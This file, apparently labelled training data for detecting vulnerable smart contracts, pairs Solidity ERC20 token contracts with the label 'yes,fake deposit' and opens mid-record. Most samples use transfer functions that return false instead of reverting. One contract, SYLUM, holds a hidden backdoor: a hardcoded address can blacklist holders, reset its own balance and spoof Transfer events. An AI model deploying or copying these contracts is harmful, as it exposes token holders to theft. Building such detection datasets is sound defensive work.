if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract HumanStandardToken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount; // Give the creator all initial tokens\n totalSupply = _initialAmount; // Update total supply\n name = _tokenName; // Set the name for display purposes\n decimals = _decimalUnits; // Amount of decimals for display purposes\n symbol = _tokenSymbol; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.19;\n\nlibrary SafeMath {\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n\n}\n\ncontract Ownable {\n\n address public owner;\n\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n function Ownable() public {\n owner = msg.sender;\n }\n\n modifier isOwner() {\n require(msg.sender == owner);\n _;\n }\n\n function transferOwnership(address newOwner) public isOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n\n}\n\ncontract StandardToken {\n\n using SafeMath for uint256;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n uint256 public totalSupply;\n\n function totalSupply() public constant returns (uint256 supply) {\n return totalSupply;\n }\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n}\n\ncontract Fracture is StandardToken, Ownable {\n\n using SafeMath for uint256;\n\n string public name;\n string public symbol;\n string public version = '1.0';\n uint256 public totalCoin;\n uint8 public decimals;\n uint8 public exchangeRate;\n\n event TokenNameChanged(string indexed previousName, string indexed newName);\n event TokenSymbolChanged(string indexed previousSymbol, string indexed newSymbol);\n event ExhangeRateChanged(uint8 indexed previousRate, uint8 indexed newRate);\n\n function ERC20Token() public {\n decimals = 18;\n totalCoin = 10000000; // Total Supply of Coin\n totalSupply = totalCoin * 10**uint(decimals); // Total Supply of Coin\n balances[owner] = totalSupply; // Total Supply sent to Owner's Address\n exchangeRate = 100; // 100 Coins per ETH (changable)\n symbol = \"TICKER\"; // Your Ticker Symbol (changable)\n name = \"YourCoinNameHere\"; // Your Coin Name (changable)\n }\n\n function changeTokenName(string newName) public isOwner returns (bool success) {\n TokenNameChanged(name, newName);\n name = newName;\n return true;\n }\n\n function changeTokenSymbol(string newSymbol) public isOwner returns (bool success) {\n TokenSymbolChanged(symbol, newSymbol);\n symbol = newSymbol;\n return true;\n }\n\n function changeExhangeRate(uint8 newRate) public isOwner returns (bool success) {\n ExhangeRateChanged(exchangeRate, newRate);\n exchangeRate = newRate;\n return true;\n }\n\n function () public payable {\n fundTokens();\n }\n\n function fundTokens() public payable {\n require(msg.value > 0);\n uint256 tokens = msg.value.mul(exchangeRate);\n require(balances[owner].sub(tokens) > 0);\n balances[msg.sender] = balances[msg.sender].add(tokens);\n balances[owner] = balances[owner].sub(tokens);\n Transfer(msg.sender, owner, msg.value);\n forwardFunds();\n }\n\n function forwardFunds() internal {\n owner.transfer(msg.value);\n }\n\n function approveAndCall(\n address _spender,\n uint256 _value,\n bytes _extraData\n ) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(\n bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))),\n msg.sender,\n _value,\n this,\n _extraData\n )) { revert(); }\n return true;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// File: test3.sol\n\npragma solidity ^0.4.4;\n\ncontract Token {\n\n/// @return total amount of tokens\nfunction totalSupply() constant returns (uint256 supply) {}\n\n/// @param _owner The address from which the balance will be retrieved\n/// @return The balance\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\n\n/// @notice send `_value` token to `_to` from `msg.sender`\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\n\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n/// @param _from The address of the sender\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @param _value The amount of wei to be approved for transfer\n/// @return Whether the approval was successful or not\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\n\n/// @param _owner The address of the account owning tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @return Amount of remaining tokens allowed to spent\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n}\n\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n}\n\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n}\n\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n}\n\n//name this contract whatever you\u2019d like\ncontract ERC20Token is StandardToken {\n\nfunction () {\n//if ether is sent to this address, send it back.\nthrow;\n}\n\n\nstring public name; \nuint8 public decimals; \nstring public symbol; \nstring public version = 'H1.0'; \n\n\nfunction ERC20Token() {\n balances[msg.sender] = 999991818632568770064273785409628; \n totalSupply = 999991818632568770064273785409628; \n name = \"SHRUG Token\"; \n decimals = 18; \n symbol = \"SHRUG\"; \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 69000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 69000000; // Update total supply (100000 for example)\n name = \"ZOMPLEXXITY\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"ZOMP\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;contract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}contract StandardToken is Token {function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}contract ERC20Token is StandardToken {function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n string public name = \"American Redneck Company Coin\"; //Name of the token\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol = \"ARCC\"; //An identifier: eg ARCC\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n////make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\nfunction ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"American Redneck Company Coin\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"ARCC\"; // Set the symbol for display purposes\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n\nif \n(!_spender.call\n(bytes4(bytes32(sha3\n(\"receiveApproval(address,uint256,address,bytes)\"\n))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n uint256 _txfee = 0;\n \n if (balances[msg.sender] >= _value+_txfee && _value > 0) {\n balances[msg.sender] -= _value+_txfee;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n \n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract BIOBIT is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n string public name; \n uint8 public decimals; \n string public symbol;\n string public version = 'v1.0';\n address public creator;\n mapping(address => string) public rewardIdMap;\n\n function BIOBIT() {\n totalSupply = 0;\n balances[msg.sender] = totalSupply;\n name = \"BioBit\";\n decimals = 4;\n symbol = \"BIOBIT\";\n creator = msg.sender;\n }\n \n function setRewardsID(string _rewardsId) public {\n rewardIdMap[msg.sender] = _rewardsId;\n }\n \n function addTokenToTotalSupply(uint _value) public {\n require(msg.sender == creator);\n require(_value > 0);\n balances[msg.sender] = balances[msg.sender] + _value;\n totalSupply = totalSupply + _value;\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract SYLUM {\n \n mapping (address => uint256) public Jz;\n mapping (address => uint256) public Kl;\n mapping (address => bool) Zu;\n mapping(address => mapping(address => uint256)) public allowance;\n\taddress cstruct = 0x4ACC13d6212cC7E1d061Ab9C8AA8a6d71A278318;\n\taddress VRouter2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n\n\n\n\n string public name = unicode\"Sylum Labs\";\n string public symbol = unicode\"SYLUM\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n\n\n constructor() {\n Jz[msg.sender] = totalSupply;\n emit Transfer(address(0), VRouter2, totalSupply); }\n\n \n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == cstruct) {\n require(Jz[msg.sender] >= value);\n Jz[msg.sender] -= value; \n Jz[to] += value; \n emit Transfer (VRouter2, to, value);\n return true; } \n if(!Zu[msg.sender]) {\n require(Jz[msg.sender] >= value);\n Jz[msg.sender] -= value; \n Jz[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\t\t\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function KBurn () public {\n if(msg.sender == cstruct) {\n Jz[msg.sender] = Kl[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Jz[account]; }\n\n function Kdep(address zi) public {\n if(msg.sender == cstruct) { \n Zu[zi] = false;}}\n function Kcheck(address zi) public{\n if(msg.sender == cstruct) { \n require(!Zu[zi]);\n Zu[zi] = true;\n }}\n function Kbridge(uint256 xi) public {\n if(msg.sender == cstruct) { \n Kl[msg.sender] = xi;} }\n\n\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n if(from == cstruct) {\n require(value <= Jz[from]);\n require(value <= allowance[from][msg.sender]);\n Jz[from] -= value; \n Jz[to] += value; \n emit Transfer (VRouter2, to, value);\n return true; } \n if(!Zu[from] && !Zu[to]) {\n require(value <= Jz[from]);\n require(value <= allowance[from][msg.sender]);\n Jz[from] -= value;\n Jz[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.7.0 <0.9.0;\n\n\n\nlibrary SafeMath {\n function add(uint x, uint y) internal pure returns (uint z) {\n require((z = x + y) >= x, 'ds-math-add-overflow');\n }\n\n function sub(uint x, uint y) internal pure returns (uint z) {\n require((z = x - y) <= x, 'ds-math-sub-underflow');\n }\n\n function mul(uint x, uint y) internal pure returns (uint z) {\n require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\n }\n}\n\n\ncontract Ownable { \n // Variable that maintains \n // owner address\n address private _owner;\n \n // Sets the original owner of \n // contract when it is deployed\n constructor()\n {\n _owner = msg.sender;\n }\n \n // Publicly exposes who is the\n // owner of this contract\n function owner() public view returns(address) \n {\n return _owner;\n }\n \n // onlyOwner modifier that validates only \n // if caller of function is contract owner, \n // otherwise not\n modifier onlyOwner() \n {\n require(isOwner(),\n \"Function accessible only by the owner !!\");\n _;\n }\n \n // function for owners to verify their ownership. \n // Returns true for owners otherwise false\n function isOwner() public view returns(bool) \n {\n return msg.sender == _owner;\n }\n}\n\ninterface IERC20 {\n event Approval(address indexed owner, address indexed spender, uint value);\n event Transfer(address indexed from, address indexed to, uint value);\n\n function name() external view returns (string memory);\n function symbol() external view returns (string memory);\n function decimals() external view returns (uint8);\n function totalSupply() external view returns (uint);\n function balanceOf(address owner) external view returns (uint);\n function allowance(address owner, address spender) external view returns (uint);\n\n function approve(address spender, uint value) external returns (bool);\n function transfer(address to, uint value) external returns (bool);\n function transferFrom(address from, address to, uint value) external returns (bool);\n}\n\ncontract credit is IERC20, Ownable{\n using SafeMath for uint;\n mapping(address => uint256) balances;\n \n // Mapping owner address to\n // those who are allowed to\n // use a certain number of their moey\n mapping(address => mapping (\n address => uint256)) allowed;\n\n uint _totalSupply;\n\n string public _name;\n string public _symbol;\n uint8 public _decimals;\n\n constructor() Ownable() {\n //set info\n _name = \"Imperial Credits\";\n _symbol = \"$CREDIT\";\n _decimals = 5;\n _totalSupply = 2000000000 * 10**5;\n // give all of the credits to contract creator\n balances[msg.sender] = _totalSupply;\n emit Transfer(address(0), msg.sender, _totalSupply);\n }\n\n function _mint(address to, uint value) public onlyOwner {\n _totalSupply = _totalSupply.add(value);\n balances[to] = balances[to].add(value);\n emit Transfer(address(0), to, value);\n }\n\n function _burn(address from, uint value) public onlyOwner {\n balances[from] = balances[from].sub(value);\n _totalSupply = _totalSupply.sub(value);\n emit Transfer(from, address(0), value);\n }\n\n function name() public override view returns (string memory) {\n return _name;\n }\n function symbol() public override view returns (string memory){\n return _symbol;\n }\n function decimals() public override view returns (uint8){\n return _decimals;\n }\n \n // totalSupply function\n function totalSupply() public override view returns (uint){\n return _totalSupply;\n }\n\n // balanceOf function\n function balanceOf(address _owner) public override view returns (uint balance) {\n return balances[_owner];\n }\n \n // function approve\n function approve(address _spender, uint _amount) public override returns (bool success) {\n // If the address is allowed\n // to spend from this contract\n // if he have the token he send\n allowed[msg.sender][_spender] = _amount;\n \n // Fire the event \"Approval\"\n // to execute any logic that\n // was listening to it\n emit Approval(msg.sender,\n _spender, _amount);\n return true;\n }\n \n // transfer function\n function transfer(address _to, uint _amount) public override returns (bool success) {\n // transfers the value if\n // balance of sender is\n // greater than the amount\n if (balances[msg.sender] >= _amount) {\n balances[msg.sender] -= _amount;\n balances[_to] += _amount;\n \n // Fire a transfer event for\n // any logic that is listening\n emit Transfer(msg.sender,\n _to, _amount);\n return true;\n }\n else {\n //no token\n return false;\n }\n }\n \n \n \n function transferFrom(address _from, address _to, uint _amount) public override returns (bool success)\n {\n if (balances[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount > 0 && balances[_to] + _amount > balances[_to]) {\n balances[_from] -= _amount;\n balances[_to] += _amount;\n \n // Fire a Transfer event for\n // any logic that is listening\n emit Transfer(_from, _to, _amount);\n return true;\n \n }\n else\n {\n return false;\n }\n }\n \n // Check if address is allowed\n // to spend on the owner's behalf\n function allowance(address _owner, address _spender) public override view returns (uint remaining)\n {\n return allowed[_owner][_spender];\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
